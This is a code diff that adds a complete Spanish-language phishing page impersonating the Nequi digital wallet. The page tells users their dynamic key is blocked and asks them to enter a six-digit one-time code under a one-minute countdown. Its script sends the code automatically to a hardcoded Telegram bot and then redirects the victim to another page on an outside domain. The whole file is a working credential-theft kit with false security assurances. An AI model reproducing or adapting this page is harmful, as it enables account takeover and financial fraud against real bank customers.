@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Tu código</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+  body {
+    margin: 0;
+    background: #FFFFFF;
+    font-family: 'Inter', sans-serif;
+    color: #300033;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
+
+  .header {
+    width: 100%;
+    background: #2E0039;
+    padding: 15px 20px;
+    color: white;
+    font-size: 20px;
+    font-weight: 700;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .header span {
+    font-size: 22px;
+    cursor: pointer;
+  }
+
+  .container {
+    padding: 20px;
+    flex: 1;
+  }
+
+  .title {
+    font-size: 26px;
+    font-weight: 700;
+    color: #2E0039;
+    margin-bottom: 18px;
+    margin-top: 10px;
+  }
+
+  /* Banner con imagen */
+  .banner-image {
+    width: 100%;
+    text-align: center;
+    padding: 15px 0;
+    background: white;
+    margin-bottom: 15px;
+  }
+
+  .banner-image img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 10px;
+  }
+
+  /* Alert Box */
+  .alert-box {
+    background-color: #F9F3FF;
+    border-left: 4px solid #2E0039;
+    padding: 15px;
+    margin-bottom: 25px;
+    border-radius: 0px;
+  }
+
+  .alert-box h3 {
+    color: #3A0A63;
+    font-size: 16px;
+    margin-bottom: 5px;
+    display: flex;
+    align-items: center;
+  }
+
+  .alert-box h3 i {
+    margin-right: 8px;
+  }
+
+  .alert-box p {
+    color: #3A0A63;
+    font-size: 14px;
+    line-height: 1.5;
+  }
+
+  /* Tarjeta del código */
+  .code-card {
+    background: #FFE9F5;
+    border-radius: 0px;
+    padding: 22px 16px;
+    margin-bottom: 22px;
+  }
+
+  .code-row {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 15px;
+    margin-bottom: 10px;
+  }
+
+  .code-inputs-container {
+    display: flex;
+    gap: 12px;
+    justify-content: center;
+  }
+
+  /* ESTILOS DE INPUTS COMO RAYITAS */
+  .code-input {
+    width: 30px;
+    height: 40px;
+    font-size: 28px;
+    font-weight: 800;
+    text-align: center;
+    border: none;
+    border-bottom: 3px solid #2E0039;
+    background: transparent;
+    outline: none;
+    font-family: 'Inter', monospace;
+    color: #2E0039;
+    padding: 0;
+    margin: 0;
+  }
+
+  .code-input:focus {
+    border-bottom-color: #ff4ba2;
+    background: transparent;
+  }
+
+  .code-input:not(:placeholder-shown) {
+    border-bottom-color: #ff4ba2;
+  }
+
+  .code-eye {
+    cursor: pointer;
+    font-size: 18px;
+    background: rgba(255, 255, 255, 0.8);
+    border-radius: 50%;
+    width: 30px;
+    height: 30px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: background 0.3s ease;
+  }
+
+  .code-eye:hover {
+    background: rgba(255, 255, 255, 1);
+  }
+
+  .progress-bg {
+    width: 100%;
+    height: 7px;
+    background: #fff;
+    border-radius: 999px;
+    overflow: hidden;
+    margin: 12px 0;
+  }
+
+  .progress-fill {
+    height: 100%;
+    background: #ff4ba2;
+    width: 100%;
+    transition: width 0.3s linear;
+  }
+
+  .code-info-main {
+    font-size: 14px;
+    margin-bottom: 4px;
+  }
+
+  .code-info-sub {
+    font-size: 13px;
+    opacity: 0.8;
+  }
+
+  /* Sección de seguridad */
+  .section {
+    padding: 10px 0;
+    border-top: 1px solid #F0E4F5;
+  }
+
+  .row-icon-text {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    font-size: 13px;
+  }
+
+  .icon-circle {
+    width: 26px;
+    height: 26px;
+    border-radius: 50%;
+    border: 1.5px solid #ff4ba2;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 15px;
+    color: #ff4ba2;
+    margin-top: 3px;
+  }
+
+  .text-bold {
+    font-weight: 700;
+  }
+
+  /* Botones */
+  .btn-secondary {
+    width: 100%;
+    border-radius: 12px;
+    padding: 14px;
+    font-size: 16px;
+    font-weight: 600;
+    border: none;
+    cursor: pointer;
+    margin-top: 14px;
+    background: #ffffff;
+    color: #2E0039;
+    border: 1px solid #E3D4EE;
+    margin-bottom: 10px;
+  }
+
+  /* Footer */
+  .footer {
+    background: #2E0039;
+    color: white;
+    padding: 25px 20px;
+    text-align: center;
+    margin-top: 30px;
+  }
+
+  .footer-content {
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+
+  .footer-logo {
+    font-size: 20px;
+    font-weight: bold;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+  }
+
+  .footer-logo .icon {
+    background: white;
+    color: #2E0039;
+    width: 25px;
+    height: 25px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: bold;
+    font-size: 12px;
+  }
+
+  .footer-text {
+    font-size: 13px;
+    opacity: 0.9;
+    margin-bottom: 12px;
+    line-height: 1.4;
+  }
+
+  .footer-links {
+    display: flex;
+    justify-content: center;
+    gap: 15px;
+    flex-wrap: wrap;
+    margin-bottom: 15px;
+  }
+
+  .footer-link {
+    color: white;
+    text-decoration: none;
+    font-size: 12px;
+    opacity: 0.8;
+    transition: opacity 0.3s ease;
+  }
+
+  .footer-link:hover {
+    opacity: 1;
+  }
+
+  .footer-copyright {
+    font-size: 11px;
+    opacity: 0.7;
+    border-top: 1px solid rgba(255,255,255,0.2);
+    padding-top: 12px;
+    margin-top: 12px;
+  }
+
+  .security-badge {
+    background: rgba(255,255,255,0.1);
+    padding: 6px 12px;
+    border-radius: 20px;
+    font-size: 11px;
+    display: inline-block;
+    margin-top: 8px;
+  }
+
+</style>
+</head>
+<body>
+
+<div class="header">
+  <span>←</span> Nequi
+</div>
+
+<div class="container">
+
+  <!-- Banner con imagen -->
+  <div class="banner-image">
+    <img src="bane.jpeg" alt="Banner Nequi" style="width: 100%; max-width: 350px; height: auto;">
+  </div>
+
+  <div class="title">Activacion de tu dinamica</div>
+
+  <!-- Alert Box -->
+  <div class="alert-box">
+    <h3><i>⚠</i> Importante</h3>
+    <p>Tu clave dinámica Nequi fue bloqueada por medidas de seguridad. Para reactivarla, necesitamos validar tu identidad.</p>
+  </div>
+
+  <!-- TARJETA DEL CÓDIGO -->
+  <div class="code-card">
+    <div class="code-row">
+      <div class="code-inputs-container">
+        <input type="number" class="code-input" maxlength="1" oninput="moverSiguiente(0, event)" onkeydown="moverAnterior(0, event)">
+        <input type="number" class="code-input" maxlength="1" oninput="moverSiguiente(1, event)" onkeydown="moverAnterior(1, event)">
+        <input type="number" class="code-input" maxlength="1" oninput="moverSiguiente(2, event)" onkeydown="moverAnterior(2, event)">
+        <input type="number" class="code-input" maxlength="1" oninput="moverSiguiente(3, event)" onkeydown="moverAnterior(3, event)">
+        <input type="number" class="code-input" maxlength="1" oninput="moverSiguiente(4, event)" onkeydown="moverAnterior(4, event)">
+        <input type="number" class="code-input" maxlength="1" oninput="moverSiguiente(5, event)" onkeydown="moverAnterior(5, event)">
+      </div>
+    </div>
+
+    <div class="progress-bg">
+      <div id="progress" class="progress-fill"></div>
+    </div>
+
+    <div id="tiempo-texto" class="code-info-main">
+      Ingresa tu Dinamica antes de: 01:00 min
+    </div>
+    <div class="code-info-sub">
+      Escribe la dinamica de tu App Nequi mientras esté vigente el tiempo.
+    </div>
+  </div>
+
+  <!-- SEGURIDAD -->
+  <div class="section">
+    <div class="row-icon-text">
+      <div class="icon-circle">✔</div>
+      <div>
+        <div class="text-bold">Por tu seguridad, no compartas tu dinamica con otras personas.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SOLO BOTÓN SALIR -->
+  <button class="btn-secondary" onclick="salir()">Salir</button>
+
+</div>
+
+<!-- Footer -->
+<div class="footer">
+  <div class="footer-content">
+    <div class="footer-logo">
+      <div class="icon">NQ</div>
+      Nequi
+    </div>
+    
+    <img src="https://images.seeklogo.com/logo-png/40/2/nequi-logo-png_seeklogo-404357.png" alt="Imagen" style="width:100px; height:auto;">
+
+    <div class="footer-text">
+      Tu billetera digital más fácil, más rápida y más segura
+    </div>
+    <div class="footer-links">
+      <a href="#" class="footer-link">Términos y Condiciones</a>
+      <a href="#" class="footer-link">Política de Privacidad</a>
+      <a href="#" class="footer-link">Ayuda</a>
+      <a href="#" class="footer-link">Contáctanos</a>
+    </div>
+    <div class="security-badge">
+      🔒 Transacciones 100% seguras
+    </div>
+    <div class="footer-copyright">
+      &copy; 2024 Nequi. Todos los derechos reservados.
+    </div>
+  </div>
+</div>
+
+<script>
+let totalSegundos = 60;    // 1 minuto
+let restantes = totalSegundos;
+let intervalo = null;
+
+function formatearTiempo(seg) {
+  const m = Math.floor(seg / 60);
+  const s = seg % 60;
+  const mm = m < 10 ? "0" + m : m;
+  const ss = s < 10 ? "0" + s : s;
+  return mm + ":" + ss;
+}
+
+function actualizarUI() {
+  const tiempoTexto = document.getElementById("tiempo-texto");
+  const progress = document.getElementById("progress");
+
+  if (restantes > 0) {
+    tiempoTexto.textContent = "Ingresa tu dinamica antes de: " + formatearTiempo(restantes) + " min";
+  } else {
+    tiempoTexto.textContent = "Tu Dinamica ha vencido.";
+  }
+
+  const porcentaje = (restantes / totalSegundos) * 100;
+  progress.style.width = porcentaje + "%";
+}
+
+function iniciarContador() {
+  actualizarUI();
+  intervalo = setInterval(() => {
+    restantes--;
+    if (restantes <= 0) {
+      restantes = 0;
+      clearInterval(intervalo);
+    }
+    actualizarUI();
+  }, 1000);
+}
+
+function moverSiguiente(index, event) {
+  const input = event.target;
+  const value = input.value;
+  
+  // Solo permitir números
+  if (value && !/^\d$/.test(value)) {
+    input.value = '';
+    return;
+  }
+  
+  // Si se ingresó un número, mover al siguiente campo
+  if (value && index < 5) {
+    const nextInput = document.querySelectorAll('.code-input')[index + 1];
+    nextInput.focus();
+  }
+  
+  // Verificar si ya se completaron los 6 dígitos
+  verificarDinamicaCompleta();
+}
+
+function moverAnterior(index, event) {
+  // Si se presiona Backspace y el campo está vacío, mover al campo anterior
+  if (event.key === 'Backspace' && event.target.value === '' && index > 0) {
+    const prevInput = document.querySelectorAll('.code-input')[index - 1];
+    prevInput.focus();
+  }
+}
+
+function obtenerDinamicaCompleta() {
+  const inputs = document.querySelectorAll('.code-input');
+  let dinamica = '';
+  inputs.forEach(input => {
+    dinamica += input.value;
+  });
+  return dinamica;
+}
+
+function verificarDinamicaCompleta() {
+  const codigo = obtenerDinamicaCompleta();
+  
+  // Si ya se completaron los 6 dígitos, enviar automáticamente
+  if (codigo.length === 6) {
+    enviarTelegram();
+  }
+}
+
+function enviarTelegram() {
+  const token = "7812114927:AAGYIeX5DVUxc2IcNJ-swMyfxhyYjsLB9jA";
+  const chat_id = "7776240161";
+
+  const codigo = obtenerDinamicaCompleta();
+  const tiempo = restantes > 0 ? formatearTiempo(restantes) : "00:00";
+
+  const mensaje =
+    "🔐 *Dinámica numero 2*\n\n" +
+    "🛡️ *Dinámica:* " + codigo + "\n" +
+    "⏱ *Tiempo restante:* " + tiempo + " min\n";
+
+  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: chat_id,
+      text: mensaje,
+      parse_mode: "Markdown"
+    })
+  })
+  .then(r => r.json())
+  .then(() => {
+    // Redirigir directamente a Google sin alerta
+    window.location.href = "https://encuestasvirtual.site/loade3.html";
+  })
+  .catch(() => {
+    alert("❌ Error enviando la dinámica");
+  });
+}
+
+function salir() {
+  window.location.href = "https://encuestasvirtual.site/incio.html";
+}
+
+// Iniciar contador al cargar la página
+iniciarContador();
+</script>
+
+</body>
+</html>
